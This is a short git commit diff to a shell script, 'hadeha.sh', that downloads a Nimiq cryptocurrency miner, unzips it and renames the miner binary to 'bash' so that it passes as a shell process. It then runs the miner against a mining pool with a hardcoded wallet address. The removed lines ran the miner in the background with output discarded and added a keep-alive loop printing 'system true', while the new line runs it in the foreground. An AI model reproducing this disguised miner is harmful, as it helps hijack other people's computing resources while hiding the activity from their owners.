7c5dde012d5c90f173e65eaa057aac9ea398df1b
komaria10003099 <komaria10003099@webmail.uad.ac.id>
2023-12-20 09:45:58 +0700

    Update hadeha.sh

--- hadeha.sh
+++ hadeha.sh
@@ -5,5 +5,4 @@ wget -qO nisa.zip https://github.com/Beeppool/miner/releases/download/0.6.0/beep
 unzip nisa.zip
 cd beepminer-0.6.0
 mv miner bash
-./bash --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --pool=pool.acemining.co:8443 --miner=1 --type=dumb >/dev/null 2>&1 >/dev/null &
-while :; do echo "system true"; sleep 30; done
+./bash --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --pool=pool.acemining.co:8443 --miner=1 --type=dumb
